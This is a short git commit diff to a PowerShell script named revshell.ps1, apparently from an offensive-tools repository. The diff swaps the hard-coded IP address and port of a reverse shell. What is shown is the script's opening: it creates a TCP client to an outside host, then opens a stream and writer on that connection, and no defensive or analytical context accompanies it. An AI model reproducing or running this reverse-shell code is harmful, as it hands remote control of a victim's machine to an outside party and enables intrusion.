ec696154fe507885e2a91ddffd2e28d6ea44ebb6
BlackSnufkin <61916899+BlackSnufkin@users.noreply.github.com>
2021-02-17 16:34:52 +0200

    Update revshell.ps1

--- Powershell/revshell.ps1
+++ Powershell/revshell.ps1
@@ -1,4 +1,4 @@
-${socket} = new-object System.Net.Sockets.TcpClient('52.14.18.129', 11097 );
+${socket} = new-object System.Net.Sockets.TcpClient('13.59.15.185', 12413 );
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
